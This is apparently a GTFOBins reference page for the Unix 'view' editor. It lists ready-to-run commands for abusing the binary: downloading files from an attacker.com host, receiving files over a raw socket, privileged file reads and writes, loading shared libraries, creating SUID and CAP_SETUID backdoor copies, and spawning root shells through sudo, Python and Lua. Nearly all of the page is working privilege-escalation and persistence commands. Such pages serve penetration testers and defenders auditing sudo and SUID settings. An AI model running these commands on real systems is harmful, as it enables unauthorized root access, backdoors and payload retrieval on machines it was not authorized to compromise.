# GTFOBin: view

## File download

It can download remote files.

This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.

```
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
```

Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.

```
export LPORT=12345
export LFILE=file_to_save
view -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
view file_to_write
iDATA
^[
w!
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
view file_to_read
```

## Library load

It loads shared libraries that may be used to run code in the binary execution context.

This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.

```
view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.

```
sudo install -m =xs $(which view) .

./view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo view -c ':!/bin/sh'
```

This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.

```
sudo view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

This requires that `view` is compiled with Lua support.

```
sudo view -c ':lua os.execute("reset; exec sh")'
```

## Capabilities

If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.

```
cp $(which view) .
sudo setcap cap_setuid+ep view

./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

This requires that `view` is compiled with Lua support.

```
sudo install -m =xs $(which view) .

./view -c ':lua os.execute("reset; exec sh")'
```